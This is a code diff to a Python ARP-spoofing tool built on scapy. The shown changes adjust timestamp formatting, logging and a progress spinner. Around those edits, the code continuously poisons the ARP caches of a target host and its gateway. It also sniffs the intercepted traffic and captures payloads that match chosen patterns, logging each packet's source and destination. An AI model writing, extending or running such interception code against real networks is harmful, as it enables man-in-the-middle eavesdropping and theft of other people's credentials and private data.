@@ -104,15 +104,16 @@ class ARPSpoofer:
 
                 # Check if payload matches any pattern
                 if not self.patterns or any(re.search(pattern, payload) for pattern in self.patterns):
+                    packet_time = datetime.datetime.fromtimestamp(packet.time).strftime('%Y-%m-%d %H:%M:%S')
                     packet_info = PacketInfo(
-                        time=datetime.datetime.fromtimestamp(packet.time).isoformat(),
+                        time=packet_time,
                         src=packet[IP].src,
                         dst=packet[IP].dst,
                         payload=payload,
                     )
                     self.captured_packets.append(packet_info)
-                    if len(self.captured_packets) % 10 == 0:
-                        self.logger.info(f"Captured {len(self.captured_packets)} matching packets")
+                    # Log every captured packet
+                    self.logger.info(f"Captured packet from {packet[IP].src} to {packet[IP].dst} at {packet_info.time}")
 
     def save_captured_data(self, format: str = "txt"):
         """Save captured packets to file."""
@@ -322,24 +323,29 @@ class ARPSpoofer:
             if self.patterns:
                 self.logger.info(f"Monitoring patterns: {self.patterns}")
 
+            # Start packet capture in a separate thread
             capture_thread = threading.Thread(
                 target=lambda: scapy.sniff(prn=self.packet_callback, store=False)
             )
             capture_thread.daemon = True
             capture_thread.start()
 
-            with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}")) as progress:
-                progress.add_task("[cyan]Spoofing...", total=None)
-                self.is_spoofing = True
-                while True:
-                    self.spoof(self.target_ip, self.gateway_ip)
-                    self.spoof(self.gateway_ip, self.target_ip)
-                    time.sleep(1)
+            self.is_spoofing = True
+            
+            # Use dots spinner instead of None
+            with self.console.status("[cyan]Spoofing in progress...", spinner="dots") as status:
+                try:
+                    while self.is_spoofing:
+                        self.spoof(self.target_ip, self.gateway_ip)
+                        self.spoof(self.gateway_ip, self.target_ip)
+                        time.sleep(1)
+                except KeyboardInterrupt:
+                    raise
 
         except NetworkException as e:
             self.logger.error(str(e))
         except KeyboardInterrupt:
-            self.logger.info("Stopping ARP spoofer...")
+            self.logger.info("\nStopping ARP spoofer...")
             self.is_spoofing = False
             self.restore(self.target_ip, self.gateway_ip)
             self.restore(self.gateway_ip, self.target_ip)
